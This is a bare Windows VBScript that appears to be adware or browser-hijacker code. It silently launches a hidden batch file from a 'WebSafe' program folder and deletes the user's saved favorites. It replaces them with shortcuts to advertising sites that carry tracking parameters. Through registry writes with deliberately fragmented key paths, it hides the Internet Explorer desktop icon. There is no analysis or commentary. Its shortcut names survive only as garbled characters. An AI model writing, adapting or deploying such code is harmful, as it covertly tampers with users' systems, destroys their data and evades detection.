Dim WSHShell
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop")
Favorites = WshShell.SpecialFolders("Favorites")
on error resume next 
strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
Rem
createobject("wscript.shell").run """"&strttWinDir&"\WebSafe\33.bat""",0
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(Favorites&"\����\*.url"), True
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\��ַ����.url")
oUrlLink.TargetPath = "http://www.6783.com/?u2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\����С��Ϸ.url")
oUrlLink.TargetPath = "http://www.yuyu.com/?fav2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����ַ����.url")
oUrlLink.TargetPath = "http://www.6783.com/?u1"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�Ա��� - �ԣ���ϲ��.url")
oUrlLink.TargetPath = "http://www.6783.com/1"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����С��Ϸ.url")
oUrlLink.TargetPath = "http://www.yuyu.com/?fav"
oUrlLink.Save
Rem
reg="{871C5380-42"&"A0-10"&"69-A2"&"EA-08002B30309D}"
RegPath="HKEY_CURRENT_USER\Soft"&"war"&"e\Mi"&"cro"&"soft\Win"&"dows\Current"&"Version\Expl"&"orer\HideDesktop"&"Icons\NewStart"&"Panel\"&reg
RegPath1="HKEY_CURRENT_USER\So"&"ftware\Mic"&"rosoft\Win"&"dows\Cu"&"rrentVer"&"sion\Explorer\Hide"&"DesktopIcons\Clas"&"sicStartMenu\"&reg
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 
'32018059089080
wscript.quit